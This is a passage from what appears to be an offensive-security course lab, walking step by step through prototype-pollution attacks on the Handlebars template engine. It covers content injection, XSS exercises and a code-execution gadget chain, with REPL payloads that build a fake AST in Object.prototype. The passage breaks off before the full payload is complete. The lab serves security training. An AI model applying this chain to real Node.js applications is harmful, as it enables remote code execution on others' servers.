To generate the intermediate code representation, an application uses the parse function, which will call parseWithoutProcessing. On line 35, this function will first check if the input is already an intermediate code representation by checking if the type is a Program. This step will be important later when we are executing code. If the input is not already a Program, it will use the parser file to process the data and return the output.

We have a lot of flexibility in how we call the parse function because of this check. If we pass in a template as a string, the library will parse and compile it. If we pass in an intermediate code representation object instead, the library will skip the parsing step and just compile it. Either way, the parse function will strip the whitespace from the output as a final step.

The parse function returns a cleaned-up intermediate code representation of the original input in the form of an Abstract Syntax Tree (AST).3 Let's use the interactive CLI to examine the AST generated by Handlebars.

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/575b6cc3-001e-4db5-abfd-b87175223311
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> Handlebars = require("handlebars")
...
}
> ast = Handlebars.parse("hello {{ foo }}")
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}

> Handlebars.parse(ast)
{
  type: 'Program',
  body: [
...
  ],
  strip: {},
  loc: {
...
  }
}
Listing 73 - Parsing with Handlebars

As shown in Listing 73, we called parse with a string containing static text ("hello ") and an expression ("{{ foo }}") to be replaced with a value. The function returned an AST, which contains a ContentStatement for the static text and a MustacheStatement for the expression. In addition, the object also contains a type variable, which is set to "Program". If we again call parse but pass it the AST object, the parse function will return the same object without any additional parsing. This is the expected behavior we mentioned previously and it will be very useful as we build our final payload.

Once the intermediate code representation is generated, it needs to be converted to operation codes, which will later be used to compile the final JavaScript code. To observe this process, we can review the precompile function in compiler/compiler.js.

472  function precompile(input, options, env) {
473    if (input == null || typeof input !== 'string' && input.type !== 'Program') {
474      throw new _exception2['default']('You must pass a string or Handlebars AST to Handlebars.precompile. You passed ' + input);
475    }
476
477    options = options || {};
478    if (!('data' in options)) {
479      options.data = true;
480    }
481    if (options.compat) {
482      options.useDepths = true;
483    }
484
485    var ast = env.parse(input, options),
486        environment = new env.Compiler().compile(ast, options);
487    return new env.JavaScriptCompiler().compile(environment, options);
488  }
Listing 74 - Precompile in Handlebars.

The precompile function will first check if the input is the expected type and initialize the options object. The input will be parsed on line 485 using the same parse function we reviewed above. Remember, the input will not be modified if we pass in AST objects. The function will then compile the AST to generate the opcodes using the compile function on line 486. Finally, the function will compile the opcodes into JavaScript code on line 487. The source code for the Compiler().compile function can be found in compiler/compiler.js while the JavaScriptCompiler().compile function can be found in the compiler/javascript-compiler.js.

Let's try generating JavaScript using this precompile function.

> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return "hello "\n' +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +  
  '},"useData":true}'
Listing 75 - Precompile Output

The JavaScript output contains the string "hello " and the code to lookup and append the foo variable.

There is no native implementation that lets us print the generated operation codes (opcodes). However, this process will be important for the RCE and we will later debug this process to understand how the AST is processed into opcodes. For now, it's important to know that before the AST is compiled into JavaScript code, it is first converted into an array of opcodes that instruct the compiler how to generate the final JavaScript code.

Let's create a function to execute this template to demonstrate the completed lifecycle of a template.

> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> hello = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> hello({"foo": "student"})
'hello student'
Listing 76 - Executing the Template

We use the eval function to convert the string to a usable object. This is only necessary because we used the precompile function. We can use the compile function, but this returns the executable function instead of the string, which would help clarify the compilation process. Next, we generate the actual template function by using the Handlebars.template function. This returns another function, which renders the template when executed (and provided with the necessary data).

This flow is summarized by the following sequence diagram.

Figure 23: Handlebars Compilation Sequence Diagram
Figure 23: Handlebars Compilation Sequence Diagram
Now that we understand how a template is rendered, let's review how we can abuse it with prototype pollution. We'll begin by determining if the target is running Handlebars and later we will focus on RCE.

Let's start by working backwards in the template generation process. The farther in the process that we find the injection point, the higher the likelihood that our injection will have a noticeable difference in the output. This is because we give the library less time to overwrite or change our modifications, or simply crash. For this reason, we'll start by reviewing the compiler/javascript-compiler.js file.

In the review, we find the appendContent function, which seems interesting.

369    // [appendContent]
370    //
371    // On stack, before: ...
372    // On stack, after: ...
373    //
374    // Appends the string value of `content` to the current buffer
375    appendContent: function appendContent(content) {
376      if (this.pendingContent) {
377        content = this.pendingContent + content;
378      } else {
379        this.pendingLocation = this.source.currentLocation;
380      }
381
382      this.pendingContent = content;
383    },
Listing 77 - appendContent Function

A function like this seems perfect for prototype pollution. A potentially unset variable (this.pendingContent) is appended to an existing variable (content). Now we just need to understand how the function is called. A search through the source code reveals that it's used in compiler/compiler.js.

228    ContentStatement: function ContentStatement(content) {
229      if (content.value) {
230        this.opcode('appendContent', content.value);
231      }
232    },
Listing 78 - Using appendContent

As discussed earlier, Handlebars will create an AST, create the opcodes, and convert the opcodes to JavaScript code. The function in Listing 78 instructs the compiler how to create opcodes for a ContentStatement. If there is a value in the content, it will call the appendContent function and pass in the content.

Let's review the AST of our input template to determine if we have a ContentStatement.

{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}
Listing 79 - AST of Input Template

The ContentStatement is used for the string portion of the template. In our case, its value is "hello ". Templates are not required to have a ContentStatement; however, for most templates to be useful, they will almost always have one. Therefore, injecting into pendingContent should almost always append content to the template.

Let's attempt to exploit this in our interactive CLI and then later exploit it using an HTTP request.

> {}.__proto__.pendingContent = "haxhaxhax"
'haxhaxhax'

> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return "haxhaxhaxhello "\n' +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +  
  '},"useData":true}'
  
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> hello = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> hello({"foo": "student"})
'haxhaxhaxhello student'
Listing 80 - Exploiting with pendingContent

The "haxhaxhax" string was included in the compiled code and the final output. Now, let's set this using an HTTP request.

Make sure that the TEMPLATING_ENGINE is set to 'hbs' when starting docker-compose. This will ensure we are using the hbs templating engine.

Figure 24: Setting pendingContent in Payload
Figure 24: Setting pendingContent in Payload
With pendingContent set in the encrypted value, let's send the request to /guaclite and exploit the prototype pollution.

Figure 25: Connecting with token
Figure 25: Connecting with token
As with EJS, the page loads without any issues. However, if we load another page at this time, we will find our content appended.

Figure 26: Viewing Appended Content
Figure 26: Viewing Appended Content
Excellent! At this point, we have a method to detect if the target is running Handlebars if we don't have access to the source code. While this is useful in blackbox targets, this is also useful for whitebox testing to help determine if a library is used when we can't figure out how or where it is used.

Now that we've exploited the prototype pollution to inject content, let's take it to the next level and obtain RCE.

Exercises
Follow along with this section but connect to the remote debugger and observe the prototype pollution exploit.

Why can we not reach RCE with the pendingContent exploit?

Obtain a working XSS with handlebars using the pendingContent exploit.

Unset pendingContent to return to normal functionality.

Extra Mile
Switch to the Pug templating engine. Discover a mechanism to detect if the target is running Pug using prototype pollution. Using this mechanism, obtain XSS against the target.

1
(Lee, 2020), https://blog.p6.is/AST-Injection/ ↩︎

2
(Farrell, 1995), http://www.cs.man.ac.uk/~pjj/farrell/comp3.html ↩︎

3
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Abstract_syntax_tree ↩︎

10.5.2. Handlebars - Remote Code Execution
With our detection mechanism working, let's attempt to execute code in Handlebars. Before we begin, we will restart the application since the prototype is polluted from the previous section.

student@chips:~/chips$ docker-compose down
Stopping chips_chips_1 ... done
Stopping rdesktop      ... done
Stopping guacd         ... done
Removing chips_chips_1 ... done
Removing rdesktop      ... done
Removing guacd         ... done
Removing network chips_default
student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
...
Listing 81 - Restarting Chips

While it might seem that we could use the pendingContent exploit that we found earlier to add JavaScript code to the compiled object, it's actually not possible. The content that's added to pendingContent is escaped, preventing us from injecting JavaScript.

> Handlebars = require("handlebars")
...

> {}.__proto__.pendingContent = "singleQuote: ' DoubleQuote: \" "
`singleQuote: ' DoubleQuote: " `

> Handlebars.precompile("Hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  `  return "singleQuote: ' DoubleQuote: \\" Hello "\n` +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +  
  '},"useData":true}'
Listing 82 - pendingContent Escaped

Let's investigate how and why the content is escaped to find a way to bypass it. As a reminder, we'll review the appendContent function in compiler/javascript-compiler.js.

375  appendContent: function appendContent(content) {
376    if (this.pendingContent) {
377      content = this.pendingContent + content;
378    } else {
379      this.pendingLocation = this.source.currentLocation;
380    }
381  
382    this.pendingContent = content;
383  },
Listing 83 - appendContent Function

The appendContent function will append to the content if pendingContent is set. At the end of the function, it sets this.pendingContent to the concatenated content. If we search the rest of compiler/javascript-compiler.js for "pendingContent" we find that it's "pushed" via the pushSource function.

881  pushSource: function pushSource(source) {
882    if (this.pendingContent) {
883      this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
884      this.pendingContent = undefined;
885    }
886
887    if (source) {
888      this.source.push(source);
889    }
890  },
Listing 84 - pushSource Function

If this.pendingContent is set, this.source.push pushes the content. However, the content is first passed to this.source.quotedString. We can find the quotedString function in compiler/code-gen.js.

118  quotedString: function quotedString(str) {
119    return '"' + (str + '').replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r').replace(/\u2028/g, '\\u2028') // Per Ecma-262 7.3 + 7.8.4
120    .replace(/\u2029/g, '\\u2029') + '"';
121  },
Listing 85 - quotedString Function

This is most likely the function that is escaping the quotes on pendingContent.

Since pushSource is used to add pending content, let's work backwards to find instances of calls to pushSource that may append the pending content. One of these instances is through the appendEscaped function in compiler/javascript-compiler.js.

416  appendEscaped: function appendEscaped() {
417  this.pushSource(this.appendToBuffer([this.aliasable('container.escapeExpression'), '(', this.popStack(), ')']));
418  },
Listing 86 - appendEscaped Function

Working back farther, we find that appendEscaped is the opcode function that is mapped to the MustacheStatement node in the AST. This function is found in compiler/compiler.js.

215  MustacheStatement: function MustacheStatement(mustache) {
216    this.SubExpression(mustache);
217  
218    if (mustache.escaped && !this.options.noEscape) {
219      this.opcode('appendEscaped');
220    } else {
221      this.opcode('append');
222    }
223  },
Listing 87 - MustacheStatement

To summarize, when the Handlebars library builds the AST, the text is converted into tokens that represent the type of content. If we remember back to our original template hello {{ foo }}, we found that it converted to two types of statements: a ContentStatement for the "hello " and a MustacheStatement for the "{{ foo }}" expression.

> ast = Handlebars.parse("hello {{ foo }}")
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}
Listing 88 - Review of AST for template

In order to convert these statements into JavaScript code, they are mapped to functions that dictate how to append the content to the compiled template. The appendEscaped function in Listing 87 is one example of this kind of function.

In order to exploit Handlebars, we could search for a statement that pushes content without escaping it. We could then review the types of components that may be added to Handlebars templates to find something that we can use. These components can be found in compiler/compiler.js.

...
215    MustacheStatement: function MustacheStatement(mustache) {
...
223    },
...
228    ContentStatement: function ContentStatement(content) {
...
232    },
233
234    CommentStatement: function CommentStatement() {},
...
309
310    StringLiteral: function StringLiteral(string) {
311      this.opcode('pushString', string.value);
312    },
313
314    NumberLiteral: function NumberLiteral(number) {
315      this.opcode('pushLiteral', number.value);
316    },
317
318    BooleanLiteral: function BooleanLiteral(bool) {
319      this.opcode('pushLiteral', bool.value);
320    },
321
322    UndefinedLiteral: function UndefinedLiteral() {
323      this.opcode('pushLiteral', 'undefined');
324    },
325
326    NullLiteral: function NullLiteral() {
327      this.opcode('pushLiteral', 'null');
328    },
...
Listing 89 - Components of a Template

Only some of the components are included in Listing 89 but they are all worth investigating.

We are already familiar with a MustacheStatement and a ContentStatement. We also find here a CommentStatement, which (like any comment) doesn't push any opcodes. However, we also find a list of literals including StringLiteral, NumberLiteral, BooleanLiteral, UndefinedLiteral, and NullLiteral.

StringLiteral uses the pushString opcode with the string value. Let's analyze this function in compiler/javascript-compiler.js starting on line 585.

585  // [pushString]
586  //
587  // On stack, before: ...
588  // On stack, after: quotedString(string), ...
589  //
590  // Push a quoted version of `string` onto the stack
591  pushString: function pushString(string) {
592    this.pushStackLiteral(this.quotedString(string));
593  },
Listing 90 - pushString Function

Listing 90 shows that pushString will also escape the quotes. This would not be a good target for us.

NumberLiteral, BooleanLiteral, UndefinedLiteral, and NullLiteral use the pushLiteral opcode. NumberLiteral and BooleanLiteral provide a variable, while UndefinedLiteral and NullLiteral provide a static value. Let's analyze how pushLiteral works. It can be found in compiler/javascript-compiler.js starting on line 595.

595  // [pushLiteral]
596  //
597  // On stack, before: ...
598  // On stack, after: value, ...
599  //
600  // Pushes a value onto the stack. This operation prevents
601  // the compiler from creating a temporary variable to hold
602  // it.
603  pushLiteral: function pushLiteral(value) {
604    this.pushStackLiteral(value);
605  },
Listing 91 - pushLiteral Function

The pushLiteral function runs pushStackLiteral with the value. This function is also found in the same file.

868  push: function push(expr) {
869    if (!(expr instanceof Literal)) {
870      expr = this.source.wrap(expr);
871    }
872
873    this.inlineStack.push(expr);
874    return expr;
875  },
876
877  pushStackLiteral: function pushStackLiteral(item) {
878    this.push(new Literal(item));
879  },
Listing 92 - pushStackLiteral and push Functions

The pushStackLiteral function calls the push function. The exact functionality of these two functions is less important than the fact that they do not escape the value in any way.

Theoretically, if we were to be able to add a NumberLiteral or BooleanLiteral object to the prototype, with a value of a command we want to run, we might be able to inject into the generated function. This should result in command execution when the template is rendered.

Let's investigate what a Handlebars NumberLiteral object might consist of. To do this, we'll use a modified test template that will create multiple types of block statements, expressions, and literals.1

{{someHelper "some string" 12345 true undefined null}}
Listing 93 - Handlebars Template with Parsed Types

This template will execute a helper with five arguments. The most important components for us in this template are the five arguments provided to the "someHelper" helper: "some string", 12345, true, undefined, and null. This will create a StringLiteral, NumberLiteral, BooleanLiteral, UndefinedLiteral, and NullLiteral. Let's use this template to generate an AST and then access the NumberLiteral object in the AST.

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> Handlebars = require("handlebars")
...
> ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')
...
> ast.body[0].params[1]
{
  type: 'NumberLiteral',
  value: 12345,
  original: 12345,
  loc: SourceLocation {
    source: undefined,
    start: { line: 1, column: 27 },
    end: { line: 1, column: 32 }
  }
}
Listing 94 - StringLiteral Object Example

To access the NumberLiteral object, we need to traverse the AST. We first access the first index in the body element (the MustacheStatement). Within this element, we can obtain access to the parameters. The number argument was the second element, so we'll access the second index in the array. This will return an example of the NumberLiteral object.

Let's generate the code to analyze how the number would be displayed in a function.

> Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 && lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),"some string",12345,true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n' +                                             
  '},"useData":true}'
Listing 95 - Precompile with NumberLiteral

Once precompiled, we can find "12345" within the generated code. If we were to use this as our injection point, we should understand where we are injecting. To do this, we'll format the return function in a more readable format.

container.escapeExpression(
	(lookupProperty(helpers, "someHelper") ||
		(depth0 && lookupProperty(depth0, "someHelper")) ||
		container.hooks.helperMissing
	).call(
		depth0 != null ? depth0 : (container.nullContext || {}),
		"some string",
		12345,
		true,
		undefined,
		null,
		{
			"name": "someHelper",
			"hash": {},
			"data": data,
			"loc": {
				"start": {
					"line": 1,
					"column": 0
				},
				"end": {
					"line": 1,
					"column": 54
				}
			}
		}
	)
);
Listing 96 - Formatted Return

The number is used as an argument to the call function. As long as the JavaScript we are injecting is syntactically correct, we do not need to do any extra escaping. Let's attempt to change the value of the number in the AST to call console.log, precompile it, and render the template.

> ast.body[0].params[1].value = "console.log('haxhaxhax')"
"console.log('haxhaxhax')"

> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  `  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 && lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),"some string",console.log('haxhaxhax'),true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n` +                          
  '},"useData":true}'
  
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
...
> tem({})
haxhaxhax
Uncaught Error: Missing helper: "someHelper"
    at Object.<anonymous> (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13)
    at Object.wrapper (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19)
    at Object.main (eval at <anonymous> (REPL14:1:1), <anonymous>:9:156)
    at main (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32)
    at ret (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12) {
  description: undefined,
  fileName: undefined,
  lineNumber: undefined,
  endLineNumber: undefined,
  number: undefined
}
Listing 97 - Rendering With Injection

We set the value of the NumberLiteral to a console.log statement. When we precompile the AST, we find the message as an argument where the number used to be. When we run the template, an error is thrown. However, before the error is thrown, our code is executed!

Now that we know what type of node we need in the AST, we need to find a way to add a NumberLiteral with our custom value. Or better yet, create our own AST with a NumberLiteral and our custom value.

Earlier, we reviewed the parseWithoutProcessing function in node_modules/handlebars/dist/cjs/handlebars/compiler/base.js.

...
33  function parseWithoutProcessing(input, options) {
34    // Just return if an already-compiled AST was passed in.
35    if (input.type === 'Program') {
36      return input;
37    }
38
39    _parser2['default'].yy = yy;
40
41    // Altering the shared object here, but this is ok as parser is a sync operation
42    yy.locInfo = function (locInfo) {
43      return new yy.SourceLocation(options && options.srcName, locInfo);
44    };
45
46    var ast = _parser2['default'].parse(input);
47
48    return ast;
49  }
Listing 98 - parseWithoutProcessing Function

On line 35, the library checks if the input passed in is already compiled. Because of this, we can pass in an AST or a raw string into the precompile function. However, if a raw string is passed in, the value of input.type is undefined. This means that the string prototype will be searched for the value. If we set the type variable in the object prototype to 'Program', we can trick Handlebars into always assuming that we are providing an AST. We can then create our own AST in the object prototype, which runs the commands that we want.

To do this, we'll set the prototype to "Program", observe the errors, and fix the errors one by one in the object prototype until we have a template that will parse.

> {}.__proto__.type = "Program"
'Program'

> Handlebars.parse("hello {{ foo }}")
Uncaught TypeError: Cannot read property 'length' of undefined
    at WhitespaceControl.Program (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/whitespace-control.js:26:28)
    at WhitespaceControl.accept (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/visitor.js:72:32)
    at HandlebarsEnvironment.parse (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:55:16)
Listing 99 - First Error When type is Set

We'll start debugging in Visual Studio Code with the CLI. We'll also check the Caught Exceptions and Uncaught Exceptions breakpoints so the debugger can immediately jump to the code that is causing the issue.

Figure 27: Start CLI Debugger With Exceptions
Figure 27: Start CLI Debugger With Exceptions
When we parse the template again, an exception is caught on line 26 of compiler/whitespace-control.js.

25    var body = program.body;
26    for (var i = 0, l = body.length; i < l; i++) {
27      var current = body[i],
28          strip = this.accept(current);
...
70    }
Listing 100 - Code at First Exception

The application threw an exception because the function expected an AST with a body but the function received a string instead. When the application attempted to access the length property, an error was thrown. We can disconnect the debugger to continue the application, set the body to an empty array in the prototype, and try again.

If we do not disconnect the debugger, we will receive exceptions as we type in the CLI. For this reason, it's best to disconnect and reconnect instead of clicking through the exceptions.

> {}.__proto__.body = []

> Handlebars.parse("hello {{ foo }}")
'hello {{ foo }}'

> Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    return "";\n' +
  '},"useData":true}'
Listing 101 - Empty Body Array

With an empty array as the body, no exception is thrown and the string is returned as-is. Also, when we attempt to precompile it, a fairly empty function is provided. While this is progress, it's not particularly helpful. Let's generate a simple template with only a MustacheStatement and review what the value of the body variable is.

> delete {}.__proto__.type
true

> delete {}.__proto__.body
true

> ast = Handlebars.parse("{{ foo }}")
...
> ast.body
[
  {
    type: 'MustacheStatement',
    path: {
      type: 'PathExpression',
      data: false,
      depth: 0,
      parts: [Array],
      original: 'foo',
      loc: [SourceLocation]
    },
    params: [],
    hash: undefined,
    escaped: true,
    strip: { open: false, close: false },
    loc: SourceLocation {
      source: undefined,
      start: [Object],
      end: [Object]
    }
  }
]
> 
Listing 102 - AST from Simple Template

It's very possible that we may need all the values from this object; however, it's best to start with a simple example and proceed from there. We'll first add an object to our body with a type variable set to "MustacheStatement". Then, we'll set the object prototype and start the debugger. Once connected, we'll run parse and precompile.

> {}.__proto__.type = "Program"
'Program'

> {}.__proto__.body = [{type: 'MustacheStatement'}]
[ { type: 'MustacheStatement' } ]
> Debugger attached.

> Handlebars.parse("hello {{ foo }}")
'hello {{ foo }}'

> Handlebars.precompile("hello {{ foo }}")
Uncaught TypeError: Cannot read property 'parts' of undefined
...
Listing 103 - precompile Exception Thrown

As shown in Listing 103, parsing did not throw an error, but precompiling did. Our debugger caught the exception and we find that it is thrown on line 552 of compiler/compiler.js.

551  function transformLiteralToPath(sexpr) {
552    if (!sexpr.path.parts) {
553      var literal = sexpr.path;
554      // Casting to string here to make false and 0 literal values play nicely with the rest
555      // of the system.
556      sexpr.path = {
557        type: 'PathExpression',
558        data: false,
559        depth: 0,
560        parts: [literal.original + ''],
561        original: literal.original + '',
562        loc: literal.loc
563      };
564    }
565  }
Listing 104 - transformLiteralToPath Function

The exception we received read: "Cannot read property 'parts' of undefined". This is occurring because the body.path variable is undefined and JavaScript cannot access the parts variable of an undefined variable. To fix this, we don't need to recreate the entire body.path object, we just need to set body.path to something. We'll set it to "0" in the object prototype. But first, we need to disconnect the debugger.

> {}.__proto__.body = [{type: 'MustacheStatement', path:0}]
[ { type: 'MustacheStatement', path: 0 } ]

> Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var stack1, helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || (depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"undefined","hash":{},"data":data,"loc":}) : helper))) != null ? stack1 : "");\n' +                                  
  '},"useData":true}'
Listing 105 - Adding path to body Object in Object prototype

When the path variable is set to "0" and a template is precompiled, a string of the function is returned. At first glance, it seems like we've discovered the minimum payload that results in a compiled template. However, if we review the output closely, the loc variable is not properly set. If we were to execute this function, we would receive a syntax error.

The loc variable was also found in the body of the legitimate AST that we generated earlier.

> delete {}.__proto__.type
true

> delete {}.__proto__.body
true

> ast = Handlebars.parse("{{ foo }}")
...
> ast.body
[
  {
    type: 'MustacheStatement',
...
    loc: SourceLocation {
      source: undefined,
      start: [Object],
      end: [Object]
    }
  }
]
> 
Listing 106 - AST from Simple Template - loc

Again, we'll start with the minimum variables set and add additional ones as needed. We'll set the loc variable to 0 and adjust accordingly if needed.

> {}.__proto__.type = "Program"
'Program'

> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0}]
[ { type: 'MustacheStatement', path: 0, loc: 0 } ]

> precompiled = Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var stack1, helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || (depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"undefined","hash":{},"data":data,"loc":0}) : helper))) != null ? stack1 : "");\n' +                                 
  '},"useData":true}'
  
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}
> tem()
''
Listing 107 - loc Set in Object Prototype

At this point, our template compiled, imported, and executed without throwing any errors. We should not expect any output since we have not added anything of substance to the MustacheStatement. Next, let's add the NumberLiteral parameter to this statement. We'll review the object of the example NumberLiteral we generated earlier and use this as a baseline for our variables.

{
  type: 'NumberLiteral',
  value: 12345,
  original: 12345,
  loc: SourceLocation {
    source: undefined,
    start: { line: 1, column: 27 },
    end: { line: 1, column: 32 }
  }
}
Listing 108 - StringLiteral Object Example

Again, we will start with the minimum and add additional values as necessary. We know we will need the type to instruct the parser to treat the value as a NumberLiteral and we need the value to inject into the compiled code. All of this will be placed into an array of objects in the params variable.

[
	{
		type: 'MustacheStatement', 
		path:0, 
		loc: 0, 
		params: [ 
			{ 
				type: 'NumberLiteral', 
				value: "console.log('haxhaxhax')" 
			} 
		]
	}
]
Listing 109 - Value to be Set in body

Listing 109 shows the value that we will be using to set in the body variable within the Object prototype.

> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0, params: [ { type: 'NumberLiteral', value: "console.log('haxhaxhax')" } ]}]
[
